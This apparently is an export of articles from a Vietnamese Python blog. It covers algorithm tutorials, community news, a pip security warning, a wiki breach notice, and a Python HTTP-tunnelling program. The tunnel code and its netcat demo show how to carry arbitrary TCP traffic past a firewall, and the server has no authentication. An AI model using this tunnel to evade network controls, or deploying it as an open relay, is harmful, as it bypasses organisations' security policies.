cóc của chúng ta có thể hỗ trợ các phần tử giống nhau. Để ý rằng độ phức tạp của Danh Sách Nhảy Cóc tương đương với Cây Nhị Phân, ngoại trừ việc Danh Sách Nhảy Cóc sử dụng nhiều bộ nhớ hơn. Bạn đọc có thể chỉ ra điểm nhỉnh hơn của Danh Sách Nhảy Cóc không? (Gợi ý: chuyện gì xảy ra đối với hai danh sách khi có nhiều tiến trình muốn thêm phần tử vào danh sách cùng một lúc ?) Hãy viết hàm in ra trạng thái của danh sách nhảy cóc. Hãy viết hàm in ra các phần tử của danh sách nhảy cóc.","tags":"Bài viết","title":"Danh sách nhảy cóc (Skip List)"},{"url":"2014/01/chuong-trinh-duong-ham-http-bang-python.html","text":"(Bài gửi đến PCNV từ cộng tác viên Vũ Khuê . Xin cảm ơn bạn.) Giới thiệu Có những lúc bạn cần kết nối đến máy chủ ngoài mạng nội bộ ở một cổng không thuộc những giao thức ứng dụng phổ biến như HTTP hay HTTPS (cổng 80 hoặc 443). Nhưnng điều đáng buồn là tường lửa chặn yêu cầu đến những cổng ngoài 80 hoặc 443. Khi đó, điều bạn có thể làm là thiết lập một chương trình trên một máy ngoại mạng. Chưong trình này nhận yêu cầu tử cổng 80 hoặc 443 và chuyển nó đến cổng và máy chủ thực sự. Việc này thường được gọi là thiết lập đường hầm (tunneling). Trên thực tế, chương trình ssh với tuỳ chọn -L thường được sử dụng cho nhiệm vụ này. Tuy nhiên trong bài này chúng ta sẽ viết chương trinh đường hầm này dựa trên giao thức HTTP. Mục đích chính là miêu tả việc xử lý dữ liệu mạng tầm thấp với Python. Cấu trúc Chương trình này gồm 2 thành phần máy khách (client) và máy chủ (server) Tunnel.py Thành phần máy khách. Thành phần này nhận yêu cầu từ một cổng nhất định và bọc dữ liệu này duới dạng một yêu cầu HTTP rồi gửi đến thành phần máy chủ. Tunneld.py Thành phần máy chủ. Thành phần thực chất là một máy chủ HTTP (HTTP server). Khi có yêu cầu gửi đến, nó sẽ đọc yêu cầu này và thực hiện tác vụ tương ứng. Ví dụ như thực hiện kết nối với một máy khác hoặc chuyển dữ liệu từ tải của yêu cầu HTTP đến máy này. Để thiết lập đường hầm, chạy 2 thành phần như sau: python tunnel.py -p [ client_listen_port ] -h [ target_host ] : [ target_port ] python tunneld.py -p [ server_listen_port ] Một ứng dụng muốn gửi yêu cầu đến máy nào đó (target_host), nó cần gửi yêu cầu đó thông qua cổng mà tunnel.py được khởi tạo với (client_listen_port). Triển khai Bạn có thể tìm thấy mã chương trình tại https://github.com/khuevu/http-tunnel . Tunnel.py Thành phần này nghe ở một cổng nhất định. Nó có 2 tiểu trình (thread) riêng biệt để nhận và trả lời yêu cầu: ... BUFFER = 1024 * 50 #set global timeout socket . setdefaulttimeout ( 30 ) class SendThread ( threading . Thread ): \"\"\" Thread to send data to remote tunneld \"\"\" ... def run ( self ): while not self . stopped (): # receive data and send to through tunnel data = self . socket . recv ( BUFFER ) self . conn . send ( data ) ... class ReceiveThread ( threading . Thread ): \"\"\" Thread to receive data from remote tunneld \"\"\" ... def run ( self ): while not self . stopped (): data = self . conn . receive () self . socket . sendall ( data ) ... Hằng số BUFFER là lượng dữ liệu theo byte mà chường trình sẽ nhận từ ứng dụng trước khi gửi qua đường hầm. Có thể có nhiều ứng dụng kết nối với chương trình tunnel.py . Vì thế, ta cần tạo kết nối riêng cho mỗi ứng dụng. Dưới đây là đoạn mã của lớp Connection : class Connection (): def __init__ ( self , connection_id , remote_addr ): self . id = connection_id self . http_conn = httplib . HTTPConnection ( remote_addr [ 'host' ], remote_addr [ 'port' ]) ... def create ( self , target_addr ): params = urllib . urlencode ({ \"host\" : target_addr [ 'host' ], \"port\" : target_addr [ 'port' ]}) headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"text/plain\" } self . http_conn . request ( \"POST\" , self . _url ( \"/\" + self . id ), params , headers ) response = self . http_conn . getresponse () response . read () if response . status == 200 : print 'Successfully create connection' return True else : print 'Fail to establish connection: status %s because %s ' % ( response . status , response . reason ) return False def send ( self , data ): params = urllib . urlencode ({ \"data\" : data }) headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"text/plain\" } try : self . http_conn . request ( \"PUT\" , self . _url ( \"/\" + self . id ), params , headers ) response = self . http_conn . getresponse () response . read () print response . status except ( httplib . HTTPResponse , socket . error ) as ex : print \"Error Sending Data: %s \" % ex def receive ( self ): try : self . http_conn . request ( \"GET\" , \"/\" + self . id ) response = self . http_conn . getresponse () data = response . read () if response . status == 200 : return data else : print \"GET HTTP Status: %d \" % response . status return \"\" except ( httplib . HTTPResponse , socket . error ) as ex : print \"Error Receiving Data: %s \" % ex return \"\" ... Như bạn thấy ở đây, Connection có những hàm để thiết lập đường hầm, gửi và nhận dữ liệu. Sự tưong tác này được xây dựng trên giao thức HTTP. Cụ thể là: POST request: yêu cầu thiết lập kết nối. PUT request: gửi dữ liệu qua kết nối. GET request: nhận kết nối. DELETE request: kết thúc kết nối. Sẽ rõ ràng hơn khi ta nhìn vào mã của tunneld.py , thành phần nhận những yêu cầu HTTP này: class ProxyRequestHandler ( BaseHTTPRequestHandler ): ... BUFFER = 1024 * 50 def _get_connection_id ( self ): return self . path . split ( '/' )[ - 1 ] ... def do_GET ( self ): \"\"\"GET: Read data from TargetAddress and return to client through http response\"\"\" s = self . _get_socket () if s : try : data = s . recv ( self . BUFFER ) print data self . send_response ( 200 ) self . end_headers () if data : self . wfile . write ( data ) ... def do_POST ( self ): \"\"\"POST: Create TCP Connection to the TargetAddress\"\"\" id = self . _get_connection_id () length = int ( self . headers . getheader ( 'content-length' )) req_data = self . rfile . read ( length ) params = cgi . parse_qs ( req_data , keep_blank_values = 1 ) target_host = params [ 'host' ][ 0 ] target_port = int ( params [ 'port' ][ 0 ]) print 'Connecting to target address: %s % s ' % ( target_host , target_port ) #open socket connection to remote server s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( target_host , target_port )) s . settimeout ( 7 ) print 'Successfully connected' #save socket reference self . sockets [ id ] = s try : self . send_response ( 200 ) self . end_headers () except socket . error , e : print e def do_PUT ( self ): \"\"\"Read data from HTTP Request and send to TargetAddress\"\"\" id = self . _get_connection_id () s = self . sockets [ id ] length = int ( self . headers . getheader ( 'content-length' )) data = cgi . parse_qs ( self . rfile . read ( length ), keep_blank_values = 1 )[ 'data' ][ 0 ] try : s . sendall ( data ) self . send_response ( 200 ) ... def do_DELETE ( self ): self . _close_socket () self . send_response ( 200 ) self . end_headers () Ở đây, ProxyRequestHandler chính là một máy chủ HTTP, nhận và xử lý những yêu cầu cơ bản của HTTP. do_POST hàm này xử lý những yêu cầu POST. Nó sẽ lấy thông tin về máy đối tượng (tên miền, cổng) và tạo kết nối TCP đến máy đó. Nó trả về trạng thái 200 nếu kết nối này thành công. do_GET hàm này lấy dữ liệu từ kết nối đã được thiết lập với máy đối tương trong do_POST . Sau đó nó trả dữ liệu này trong trả lời HTTP của yêu cầu GET. do_PUT hàm này lấy nhận yêu cầu PUT, đọc dữ liệu từ tải của yêu cầu đó và gửi qua kết nối nói trên. do_DELETE hàm này đóng kết nối với máy đối tượng. Thử nghiệm chương trình Chúng ta sẽ thử chương trình này bằng việc kết nối với một IRC server thông qua chương trình. Trước hết, thiết lập đường hầm cần thiết. Tại một máy ngoại mạng, không bị chặn bởi tường lửa, chạy: python tunneld.py -p 80 Tại máy nội mạng chạy: python tunnel.py -p 8889 -h mayngoaimang:80 irc.freenode.net:6667 Như vậy ta đã thiết lập một đương hầm ở cổng 8889 qua máy ngoại mạng đến IRC server ở cổng 6667. Yêu cầu đến cổng 6667 thường bị chặn bởi tường lửa. Để thử nghiệm, ta kết nối đến cổng 8889 và gửi yêu cầu theo giao thức IRC: nc localhost 8889 NICK abcxyz USER abcxyz abcxyz irc.freenode.net :abcxyz (nc - netcat - là một công cụ giúp bạn gửi giữ liệu trên TCP http://www.irongeek.com/i.php?page=backtrack-3-man/netcat .) Ta nhận được trả lời thông báo kết nối thành công: :calvino.freenode.net NOTICE * :*** Looking up your hostname... :calvino.freenode.net NOTICE * :*** Checking Ident :calvino.freenode.net NOTICE * :*** Found your hostname :calvino.freenode.net NOTICE * :*** No Ident response NICK abcxyz USER abcxyz abcxyz irc.freenode.net :abcxyz :calvino.freenode.net 001 abcxyz :Welcome to the freenode Internet Relay Chat Network abcxyz :calvino.freenode.net 002 abcxyz :Your host is calvino.freenode.net[ ... /6667], running version ircd-seven-1.1.3 :calvino.freenode.net 003 abcxyz :This server was created Sun Dec 4 2011 at 14:42:47 CET :calvino.freenode.net 004 abcxyz calvino.freenode.net ircd-seven-1.1.3 DOQRSZaghilopswzCFILMPQbcefgijklmnopqrstvz bkloveqjfI :calvino.freenode.net 005 abcxyz CHANTYPES=# EXCEPTS INVEX CHANMODES=eIbq,k,flj,CFLMPQcgimnprstz CHANLIMIT=#:120 PREFIX=(ov)@+ MAXLIST=bqeI:100 MODES=4 NETWORK=freenode KNOCK STATUSMSG=@+ CALLERID=g :are supported by this server :calvino.freenode.net 005 abcxyz CASEMAPPING=rfc1459 CHARSET=ascii NICKLEN=16 CHANNELLEN=50 TOPICLEN=390 ETRACE CPRIVMSG CNOTICE DEAF=D MONITOR=100 FNC TARGMAX=NAMES:1,LIST:1,KICK:1,WHOIS:1,PRIVMSG:4,NOTICE:4,ACCEPT:,MONITOR: :are supported by this server :calvino.freenode.net 005 abcxyz EXTBAN=$,arx WHOX CLIENTVER=3.0 SAFELIST ELIST=CTU :are supported by this server :calvino.freenode.net 251 abcxyz :There are 232 users and 70582 invisible on 31 servers :calvino.freenode.net 252 abcxyz 45 :IRC Operators online :calvino.freenode.net 253 abcxyz 10 :unknown connection(s) :calvino.freenode.net 254 abcxyz 34513 :channels formed :calvino.freenode.net 255 abcxyz :I have 6757 clients and 1 servers :calvino.freenode.net 265 abcxyz 6757 10768 :Current local users 6757, max 10768 :calvino.freenode.net 266 abcxyz 70814 83501 :Current global users 70814, max 83501 :calvino.freenode.net 250 abcxyz :Highest connection count: 10769 (10768 clients) (2194912 connections received) ... Kết Như vậy chúng ta đã đi qua một chương trình xử lý dữ liệu mạng với Python. Chương trình chủ yếu làm việc với dữ liệu thông qua socket API. Một điều quan trọng khác mà bài viết này đề cập đến là sự tách biệt giữa giao thức ứng dụng và dữ liệu gửi trên giao thức đó. Chúng ta có thể vận chuyển dữ liệu mà thông thường đuợc gửi bằng giao thức này qua một giao thức khác. Chú ý: Chương trình chỉ có mục đích thí nghiệm và không phù hợp với chạy thực dụng.","tags":"Bài viết","title":"Chương trình đường hầm HTTP bằng Python"},{"url":"2014/01/thuat-toan-dep-tim-chuoi-boyer-moore-horspool.html","text":"Mục đích Tìm chính xác (exact match) chuỗi con (substring) trong một chuỗi dài hơn. Ý tưởng chính Gọi chuỗi cần tìm là P (pattern), và chuỗi dài là T (text). So sánh ngược P trong T, nghĩa là ta sẽ so sánh ký tự cuối của P trước, sau đó so sánh ký tự kế cuối, và lần lượt như vậy đến ký tự đầu tiên trong P. Gọi vị trí trong T để bắt đầu so sánh hai chuỗi là i . Việc so sánh sẽ so sánh lần lượt T[i] với ký tự cuối của P, rồi T[i-1] với ký tự kế cuối của P, v.v... Nếu việc so sánh ngược vượt qua được ký tự đầu tiên trong P, ta đã tìm được P trong T. Nếu việc so sánh ngược bị thất bại, ta sẽ căn P cho khớp với T[i] và thử lại việc so sánh ngược. Điều này tương đương với việc dịch chuyển i đến vị trí xa hơn trong T. Đây là ý tưởng chủ chốt của thuật toán BMH. Nếu T[i] không có trong P, thì ta có thể dịch chuyển i đến vị trí i + len(P) . Nếu vị trí cuối cùng của T[i] trong P là x thì ta dịch chuyển i đến vị trí i + len(P) - x - 1 . Trạng thái bắt đầu i | v +-+-+-+-+-+-+-+-+-+-+-+-+ | | | | |d|b|a| | | | | | +-+-+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+ |a|a|c|b|a| +-+-+-+-+-+ ------------------------------------------ So sánh tiếp tục i | v +-+-+-+-+-+-+-+-+-+-+-+-+ | | | | |d|b|a| | | | | | +-+-+-+-+-+-+-+-+-+-+-+-+ = +-+-+-+-+-+ |a|a|c|b|a| +-+-+-+-+-+ ------------------------------------------ So sánh tiếp tục i | v +-+-+-+-+-+-+-+-+-+-+-+-+ | | | | |d|b|a| | | | | | +-+-+-+-+-+-+-+-+-+-+-+-+ = = +-+-+-+-+-+ |a|a|c|b|a| +-+-+-+-+-+ ------------------------------------------ So sánh sai i | v +-+-+-+-+-+-+-+-+-+-+-+-+ | | | | |d|b|a| | | | | | +-+-+-+-+-+-+-+-+-+-+-+-+ ! = = +-+-+-+-+-+ |a|a|c|b|a| +-+-+-+-+-+ ------------------------------------------ Căn P theo T[i]... i | v +-+-+-+-+-+-+-+-+-+-+-+-+ | | | | |d|b|a| | | | | | +-+-+-+-+-+-+-+-+-+-+-+-+ | +-+-+-+-+-+ |a|a|c|b|a| +-+-+-+-+-+ ------------------------------------------ ... cũng có nghĩa là dịch chuyển i i | v +-+-+-+-+-+-+-+-+-+-+-+-+ | | | | |d|b|a| | | | | | +-+-+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+ |a|a|c|b|a| +-+-+-+-+-+ Để cài đặt hai bước trên, người ta thường dùng một mảng chứa vị trí cuối cùng của các ký tự trong P trừ ký tự cuối cùng (P[ : -1]). Ví dụ Giả sử chúng ta muốn tìm chuỗi needle trong chuỗi find the needle in the haystack . Trước khi bắt đầu, ta sẽ lập bảng vị trí cuối của các ký tự trong P[ : -1]. Ký tự Vị trí Diễn giải n 0 e 2 Ta chọn vị trí của ký tự thứ hai. d 3 l 4 Sau đó ta sẽ xem xét sự thay đổi ở các bước của thuật toán. Vì độ dài của P là 6, nên i sẽ bắt đầu từ vị trí 5. Trong bảng dưới, chữ đậm là ký tự trùng nhau của T và P, chữ gạch dưới là các ký tự đang xét. i T T[i] Diễn giải 5 find t he needle in the haystack t t không có trong bảng. Dịch i lên 11 (5 + 6). 11 find t he ne e dle in the haystack e e có trong bảng. Dịch i lên 14 (11 + 6 - 2 - 1). 14 find the needle in the haystack e Tìm thấy . e có trong bảng. Dịch i lên 17 (14 + 6 - 2 - 1). 17 find the nee dle in the haystack n n có trong bảng. Dịch i lên 22 (17 + 6 - 0 - 1). 22 find the needle i n the haystack khoảng trắng khoảng trắng không có trong bảng. Dịch i lên 28 (22 + 6). 28 find the needle in the haysta ck a a không có trong bảng. Dịch i lên 34 (28 + 6). Dừng việc tìm kiếm vì đã xét hết chuỗi. Độ phức tạp Thời gian chạy Tệ nhất là O(n*m), với n là độ dài của T và m là độ dài của P. Trung bình là O(n). Và tốt nhất là dưới tuyến tính (sublinear) vì thuật toán có thể nhảy qua nhiều ký tự. Trong ví dụ trên, ta chỉ cần 12 phép so sánh để tìm chuỗi needle (6 ký tự) trong chuỗi find the needle in the haystack (31 ký tự). Bộ nhớ cần thiết O(n) với n là số ký tự trong bảng chữ cái (ví dụ như 256 giá trị của một byte, hoặc nếu bảng chữ cái là Unicode thì có thể sẽ nhiều hơn 60000 giá trị) vì chúng ta cần tạo bảng vị trí các ký tự trong P. Thuật toán BMH là thuật toán tìm chuỗi chính xác tổng quát nhất, nhanh nhất, và đơn giản nhất.","tags":"Bài viết","title":"Thuật toán đẹp: Tìm chuỗi Boyer-Moore-Horspool"},{"url":"2013/12/thuat-toan-dep-partition-ngan.html","text":"Mục đích Chia một mảng ra thành hai cụm: một cụm thỏa điều kiện, và cụm còn lại. Cài đặt Sử dụng mảng phụ def partition ( a , pred ): head = [ x for x in a if pred ( x )] tail = [ x for x in a if not pred ( x )] return head + tail , len ( head ) Không dùng mảng phụ Ý tưởng chính là sử dụng một biến phụ chứa vị trí trong mảng A mà nếu phần tử đang xét thỏa điều kiện sẽ được chuyển vào. def partition ( a , pred ): okay_idx = 0 for i , x in enumerate ( a ): if pred ( x ): a [ okay_idx ], a [ i ] = a [ i ], a [ okay_idx ] # swap okay_idx += 1 return a , okay_idx Độ phức tạp Thời gian chạy O(n) Bộ nhớ cần thiết O(n) nếu sử dụng mảng phụ, hoặc O(1) nếu không Ứng dụng Ứng dụng nổi tiếng nhất là thuật toán QuickSort do Tony Hoare sáng tạo ra. Thuật toán QuickSort sắp xếp một mảng với độ phức tạp trung bình là O(n*logn) với n là số lượng phần tử trong mảng. Độ phức tạp trong trường hợp xấu nhất có thể là O(n*n). Sau đây là một cài đặt dễ hiểu của QuickSort. Cài đặt này chỉ dùng để thể hiện ý tưởng chứ không nên dùng trong các ứng dụng. Ý tưởng chủ đạo là lấy ra một phần tử nào đó trong A (tức là A' chỉ còn N-1 phần tử) gọi là pivot , ngăn A' thành hai cụm (một cụm nhỏ hơn pivot, một cụm còn lại). Tiếp tục gọi đệ quy để sắp xếp hai cụm đó và nối chúng lại với nhau thông qua pivot. def quicksort ( a ): if len ( a ) <= 1 : return a pivot = a [ - 1 ] a , pivot_idx = partition ( a [ : - 1 ], lambda x : x <= pivot ) return quicksort ( a [ : pivot_idx ]) + [ pivot ] + quicksort ( a [ pivot_idx : ]) import itertools for l in range ( 8 ): a = range ( l ) for p in itertools . permutations ( a ): p = list ( p ) assert quicksort ( p ) == a Bài toán mở rộng Cho một mảng số nguyên A. Tìm K phần tử nhỏ nhất trong A. Cho một mảng số nguyên A và một số nguyên X. Đếm số tập hợp 2-phần-tử trong mảng A có tổng nhỏ hơn hoặc bằng X. Các bạn có thể trao đổi về cách giải bài các bài toán mở rộng này với độ phức tạp trung bình O(n) trong diễn đàn.","tags":"Bài viết","title":"Thuật toán đẹp: Partition (ngăn)"},{"url":"2013/12/thuat-toan-dep-tim-nhi-phan.html","text":"Mục đích Tìm phần tử X trong một mảng đã được sắp xếp . Ý tưởng chính Chia mảng ra thành 3 cụm: cụm bên trái, phần tử ở giữa, và cụm bên phải. So sánh X với phần tử ở giữa. Nếu X bằng với phần tử ở giữa thì ta đã tìm được X trong mảng. Nếu X lớn hơn thì tìm X trong cụm bên phải. Nếu X nhỏ hơn thì tìm X trong cụm bên trái. Hiệu quả Thời gian thực hiện O(logn) Bộ nhớ cần thiết O(1) Cài đặt Cài đặt đệ quy def bin_search ( x , a , left_idx , right_idx ): if left_idx > right_idx : return - 1 mid_idx = left_idx + ( right_idx - left_idx ) // 2 mid = a [ mid_idx ] if x == mid : return mid_idx elif x < mid : return bin_search ( x , a , left_idx , mid_idx - 1 ) else : return bin_search ( x , a , mid_idx + 1 , right_idx ) assert bin_search ( 0 , [ 0 ], 0 , 0 ) == 0 assert bin_search ( 0 , [ 1 ], 0 , 0 ) == - 1 assert bin_search ( 0 , [ 0 , 1 ], 0 , 1 ) == 0 assert bin_search ( 1 , [ 0 , 1 ], 0 , 1 ) == 1 assert bin_search ( 2 , [ 0 , 1 ], 0 , 1 ) == - 1 Cài đặt vòng lặp def bin_search ( x , a , left_idx , right_idx ): while left_idx <= right_idx : mid_idx = left_idx + ( right_idx - left_idx ) // 2 mid = a [ mid_idx ] if mid == x : return mid_idx elif x < mid : right_idx = mid_idx - 1 else : left_idx = mid_idx + 1 return - 1 Tham khảo thêm Mô-đun bisect trong thư viện chuẩn của Python. Một số bài toán mở rộng Mảng đã được sắp xếp nhưng đã bị xoay vòng (ví dụ [4, 5, 6, 7, 1, 2, 3]). Mảng 2 chiều đã được sắp xếp theo dòng, và cột (a[i][j] < a[i + 1][j] và a[i][j] < a[i][j + 1]). Các bạn có thể trao đổi ý tưởng giải quyết các bài toán mở rộng này trong diễn đàn.","tags":"Bài viết","title":"Thuật toán đẹp: Tìm nhị phân"},{"url":"2013/04/ket-qua-cuoc-thi-giai-toan-lan-ii.html","text":"Cảm ơn sự hưởng ứng nhiệt tình của các bạn với cuộc thi giải toán lần II của PCNV. Lần này nhóm nhận được sự sự tham gia của năm bạn Phạm Ngọc Quang Nam, Nguyễn Văn Nam, Vũ Khuê, Hoàng Quốc Thịnh, và Đậu Duy Khánh. Bài của bạn Thịnh: 09:03:48 ~/tmp/pell2$ python3.3 thinhhq.py | python timer.py > thinhhq.txt 09:04:22 ~/tmp/pell2$ python checker.py < thinhhq.txt Max 448985 09:04:30 ~/tmp/pell2$ python3.3 thinhhq.py | python timer.py > thinhhq.txt2 09:05:04 ~/tmp/pell2$ python checker.py < thinhhq.txt2 Max 449905 09:05:08 ~/tmp/pell2$ python3.3 thinhhq.py | python timer.py > thinhhq.txt3 09:05:39 ~/tmp/pell2$ python checker.py < thinhhq.txt3 Max 449421 Bài của bạn Văn Nam: 09:05:46 ~/tmp/pell2$ python3.3 namnv.py | python timer.py > namnv.txt 09:07:12 ~/tmp/pell2$ python checker.py < namnv.txt Max 1394855 09:07:28 ~/tmp/pell2$ python3.3 namnv.py | python timer.py > namnv.txt2 09:07:47 ~/tmp/pell2$ python checker.py < namnv.txt2 Max 1394855 09:08:00 ~/tmp/pell2$ python3.3 namnv.py | python timer.py > namnv.txt3 09:08:19 ~/tmp/pell2$ python checker.py < namnv.txt3 Max 1394855 Bài của bạn Khanh: 09:12:49 ~/tmp/pell2$ python3.3 khanhdd.py | python timer.py > khanhdd.txt Traceback (most recent call last): File \"khanhdd.py\", line 13, in <module> print (a1,' ',b1) BrokenPipeError: [Errno 32] Broken pipe 09:13:27 ~/tmp/pell2$ python checker.py < khanhdd.txt ERROR:root:Format Traceback (most recent call last): File \"checker.py\", line 16, in <module> n, k = map(long, line.split()) ValueError: too many values to unpack Bài của bạn Khuê: 09:14:37 ~/tmp/pell2$ python3.3 khuev.py | python timer.py > khuev.txt File \"khuev.py\", line 35 print \"n: %d - k: %d\" % (-b / 2, k) &#94; SyntaxError: invalid syntax Bài của bạn Quang Nam: 09:15:19 ~/tmp/pell2$ python3.3 nampnq.py | python timer.py > nampnq.txt File \"nampnq.py\", line 5 print \"n=%d, k=%d\" % (n,k) &#94; SyntaxError: invalid syntax Mã nguồn và bản lưu kết quả của cuộc thi có thể được tải về từ https://docs.google.com/file/d/0B5X03CmpgiFeMkNubXlGNFlCMjQ/edit?usp=sharing . Như vậy, bạn Văn Nam đã thắng giải kỳ này. Xin chúc mừng bạn Văn Nam. Bạn Văn Nam gửi thư cho admin@ cho biết mẫu áo bạn chọn, và thông tin bưu điện để nhóm PCNV có thể gửi áo cho bạn.","tags":"Tin tức","title":"Kết quả cuộc thi giải toán lần II"},{"url":"2013/03/cuoc-thi-giai-toan-bang-python.html","text":"Trong lần thi trước ( http://www.vithon.org/2010/05/24/phat-d%E1%BB%99ng-cu%E1%BB%99c-thi-gi%E1%BA%A3i-toan-b%E1%BA%B1ng-python ), chúng ta đánh giá chương trình dựa trên số lượng cặp N, K tìm được. Tiêu chí của lần thi này là in ra cặp số N, K lớn nhất có thể tìm được trong 30 giây. Cặp số cuối cùng được in ra trong 30 giây sẽ được xem là cặp số lớn nhất và dùng để đánh giá các chương trình với nhau. Giải thưởng của kỳ thi lần này sẽ là một áo thun do bạn Nguyễn Thành Nam đã tặng nhóm PCNV trong lần đi PyCon vừa qua. Các bạn có thể xem qua các áo giải thưởng (trừ EdX cỡ L, các áo khác cỡ M, chỉ được chọn 1) ở URL sau: https://drive.google.com/folderview?id=0B5X03CmpgiFeNzNJN09qZnd2Sk0&usp=sharing Các bài tham dự gửi bằng thư điện tử về cho admin@ hạn chót trong ngày 14 tháng 04 năm 2013 . Nhằm khuyến khích việc sử dụng Python 3, các bài tham gia kỳ thi này sẽ được chấm trên Python 3.3 . Mòng các bạn chú ý yêu cầu này. Quyết định của người chấm là cuối cùng. Xin miễn nhận khiếu nại.","tags":"Tin tức","title":"Cuộc thi giải toán bằng Python"},{"url":"2013/03/ghi-nho-ve-pycon-2013.html","text":"Hội thảo PyCon 2013 vừa kết thúc vào Chủ Nhật, ngày 18 tháng 03 năm 2013 vừa rồi tại Trung tâm Hội nghị Santa Clara, bang California, Mỹ. Hội thảo lần này diễn ra vào các ngày thứ sáu, thứ bảy, và Chủ Nhật với khoảng 100 bài tham luận và 2500 người tham dự đến từ tất cả các châu lục trên trái đất. Trong đó, khoảng 20% là nữ giới! Nhóm PCNV có một thành viên tham gia hội thảo lần này, và họ có một số nhận xét chính như sau: Hội thảo có nhiều chuyên mục phù hợp với mọi lứa tuổi, mọi ngành nghề, mọi giới tính. Có cả những em thiếu niên khoảng 10 đến 12 tuổi tham gia hội thảo. Một số các em đã biết Python còn đứng lớp chỉ dạy Python cho các em khác. Thậm chí có một số em đã trình bày sản phẩm của chính mình trong phân mục tự giới thiệu (poster session), cùng với gần trăm sản phẩm khác từ các công ty lớn cũng như các chuyên gia trong ngành. Nữ giới chiếm gần 20% người tham gia hội thảo. Một số cá nhân trên 60 tuổi cũng thấy xuất hiện tại hội thảo. Thậm chí cả người chuyển đổi giới tính cũng có mặt! Có thể khẳng định chắc chắn rằng Python thu hút được sự quan tâm của tất cả mọi người. Hội thảo năm nay có sự xuất hiện của nhiều nhóm nữ giới như CodeChix, WomanWhoCode, PyLadies, LadyCoders. Đây là một tín hiệu đáng mừng. So với các ngôn ngữ lập trình đa dụng khác, có lẽ Python là ngôn ngữ thu hút nữ giới nhiều nhất! Hội thảo năm nay có một sự ngạc nhiên thú vị. Mỗi cá nhân tham dự hội thảo được tặng một thiết bị Rasberry Pi miễn phí! Điều này cho thấy Python có một vị trí quan trọng trong thị trường phần cứng nghiệp dư, kinh tế. Trong hội thảo cũng thiết lập một \"Phòng nghiên cứu Rasberry Pi\" để hướng dẫn cách cài đặt và sử dụng thiết bị đó. Các bài tham luận chớp nhoáng (lightning talks) cho thấy Python có khả năng ứng dụng rộng rãi và đáng ngạc nhiên. Một số ví dụ điển hình như sử dụng Python để điều khiển hệ thống đèn LED nhấp nháy, sử dụng Python trên các hệ máy Atari, sử dụng Python để thông dịch và gỡ rối mã Lisp/Scheme. Lập trình viên Python có khả năng Rap không thua kém các ca sĩ chuyên nghiệp! Đoạn phim bên dưới quay lại cảnh Larry Hastings, thành viên nòng cốt trong nhóm phát triển Python, hát bài rap tự chế trước phiên tham luận chớp nhoáng. http://youtu.be/rKiySLUrYQ8 Bạn Nguyễn Thành Nam có mặt tại hội thảo đã chụp tấm hình tự sướng này. https://docs.google.com/file/d/0B5X03CmpgiFeb3pfMTlIVlBCQ3M/edit?usp=sharing Bạn Nam cũng đã ủng hộ một số món quà nhỏ cho nhóm PCNV dùng để khuyến khích các bạn đã có bài viết đóng góp cho nhóm. Nhóm PCNV sẽ gửi trực tiếp cho các bạn.","tags":"Tin tức","title":"Ghi nhớ về PyCon 2013"},{"url":"2013/02/canh-bao-can-than-khi-su-dung-pip-trong-mang.html","text":"Pip ( http://pypi.python.org/pypi/pip ), cũng như một số các công cụ sử dụng mô-đun có sẵn urllib , urllib2 , httplib , có thể bị tấn công kẻ ở giữa (man-in-the-middle) và làm thay đổi nội dung của gói tin nhận được. Lý do là khi truy cập vào một địa chỉ HTTPS hoặc các giao thức SSL/TLS, các mô-đun có sẵn này không kiểm tra chứng từ (certificate) của máy chủ để xác nhận máy chủ đó đúng là máy chủ chương trình cần truy cập. Điều này cho phép một kẻ thứ ba giả dạng máy chủ và thay đổi nội dung gói tin yêu cầu cũng như trả lời. Do đó, người sử dụng cần cẩn trọng khi sử dụng các công cụ như pip trong một mạng không an toàn. Thông tin thêm có thể được tham khảo tại: http://www.reddit.com/r/Python/comments/17rfh7/warning_dont_use_pip_in_an_untrusted_network_a/ Kể từ Python 3.2, các mô-đun có sẵn liên quan đến SSL/TLS đã có thêm chức năng kiểm tra chứng từ nhưng chức năng này phải được tự kích hoạt.","tags":"Tin tức","title":"Cảnh báo: Cẩn thận khi sử dụng pip trong mạng"},{"url":"2013/01/chuong-trinh-pycon-us-2013.html","text":"Chương trình hội thảo PyCon năm nay đã được công bố vào bốn ngày trước. https://us.pycon.org/2013/schedule/ Sau nhiều tuần đánh giá các bài tham luận, chương trình của hội thảo cuối cùng đã được thống nhất. Năm nay số lượng người tham dự tăng đột ngột và 1000 vé bán trước (early bird) đã không còn nữa. Tổng lượng vé bán ra được giới hạn ở mức 2500 vé. Nếu bạn muốn tham dự hội thảo, bạn cần phải mua vé ngay bây giờ . Hội thảo bắt đầu từ ngày 13 đến ngày 21 tháng 03 . So với năm ngoái, hội thảo năm nay có thêm một chuyên mục thứ sáu, nâng tổng số bài tham luận lên 114 bài. Các bài điểm của hội thảo sẽ được trình bày bởi những nhân vật tên tuổi như Eben Upton, Jessica McKellar, Raymond Hettinger, và Guido van Rossum. PS: Nếu không có điều kiện tham dự hội thảo, các bạn cũng có thể xem phim quay lại tại http://pyvideo.org .","tags":"Tin tức","title":"Chương trình PyCon US 2013"},{"url":"2013/01/wikipythonorg-bi-tan-cong.html","text":"Brian Curtin vừa gửi thông báo trên hộp thư chung python-dev với nội dung như sau: Vào ngày 28 tháng 12, một cá nhân chưa xác định được đã sử dụng một lỗi chưa công bố để tấn công http://wiki.python.org . Cá nhân này đã lấy được quyền truy cập như người dùng moin trên máy chủ, nhưng các dịch vụ khác vẫn chưa bị ảnh hưởng. Mọi dữ liệu cá nhân cũng như mật khẩu tại http://wiki.python.org xem như đã nằm trong tay kẻ xấu. Nếu bạn có truy cập và tạo tài khoản trên trang http://wiki.python.org và sử dụng cùng mật khẩu ở các trang mạng khác thì hãy đổi ngay mật khẩu ở các trang mạng khác đó. Thông tin cập nhật sẽ được Brian Curtin gửi trên python-dev .","tags":"Tin tức","title":"wiki.python.org bị tấn công"},{"url":"2012/07/truy-van-trieu-ban-ghi-voi-mysql.html","text":"Trong bài viết của bạn Phạm Thị Minh Hoài , chúng ta đã được hướng dẫn cách truy vấn MySQL với DB-API của Python. Phần này chúng ta sẽ bàn về một số điểm cần chú ý nếu câu truy vấn của chúng ta trả về một lượng lớn bản ghi từ MySQL. 